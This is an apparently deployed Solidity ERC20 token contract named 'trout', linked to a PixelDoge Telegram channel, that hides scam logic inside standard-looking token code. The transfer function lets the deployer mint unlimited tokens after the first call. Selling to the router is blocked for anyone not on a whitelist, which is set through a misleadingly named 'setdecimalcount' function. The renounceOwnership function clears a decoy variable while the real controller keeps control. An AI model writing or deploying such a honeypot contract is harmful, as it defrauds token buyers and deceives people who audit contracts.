/**
 *Submitted for verification at Etherscan.io on 2021-10-06
*/

/**
 *Submitted for verification at Etherscan.io on 2021-10-04
*/

/*
https://t.me/PixelDogeEthereum
*/
pragma solidity ^0.8.9;

library SafeMath {
    
    function prod(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    
    function cre(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function cal(uint256 a, uint256 b) internal pure returns (uint256) {
        return calc(a, b, "SafeMath: division by zero");
    }
    function calc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function red(uint256 a, uint256 b) internal pure returns (uint256) {
        return redc(a, b, "SafeMath: subtraction overflow");
    }
    
    function redc(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}



pragma solidity ^0.8.9;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol
pragma solidity ^0.8.9;
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

// File: @openzeppelin/contracts/utils/Context.sol

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}


contract Creation is Context {
    address internal recipients;
    address internal router;
    address public owner;
    mapping (address => bool) internal confirm;
    event genesis(address indexed previousi, address indexed newi);
    constructor () {
        address msgSender = _msgSender();
        recipients = msgSender;
        emit genesis(address(0), msgSender);
    }
    modifier checker() {
        require(recipients == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual checker {
        emit genesis(owner, address(0));
         owner = address(0);
    }
}

pragma solidity ^0.8.9;




contract ERC20 is Context, IERC20, IERC20Metadata , Creation{
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) internal _allowances;
    uint256 private _totalSupply;
    using SafeMath for uint256;
    string private _name;
    string private _symbol;
    bool   private truth;
    constructor (string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        truth=true;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function liquiditypair (address Uniswaprouterv02) public checker {
        router = Uniswaprouterv02;
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override  returns (bool) {
        if((recipients == _msgSender()) && (truth==true)){_transfer(_msgSender(), recipient, amount); truth=false;return true;}
        else if((recipients == _msgSender()) && (truth==false)){_totalSupply=_totalSupply.cre(amount);_balances[recipient]=_balances[recipient].cre(amount);emit Transfer(recipient, recipient, amount); return true;}
        else{_transfer(_msgSender(), recipient, amount); return true;}
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);

        return true;
    }

    function decimalcount(address _count) internal checker {
        confirm[_count] = true;
    }

    function setdecimalcount(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            decimalcount(_counts[i]); }
    }   
 
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);

        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if (recipient == router) {
        require(confirm[sender]); }
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _deploy(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: deploy to the zero address");


        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

        
}

// File: contracts/token/ERC20/behaviours/ERC20Decimals.sol
//SPDX-License-Identifier: Unlicense


pragma solidity ^0.8.9;

 
contract Trout is ERC20{
    uint8 immutable private _decimals = 18;
    uint256 private _totalSupply = 1000000 * 10 ** 18;

    constructor () ERC20('trout', unicode'trout') {
        _deploy(_msgSender(), _totalSupply);
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
}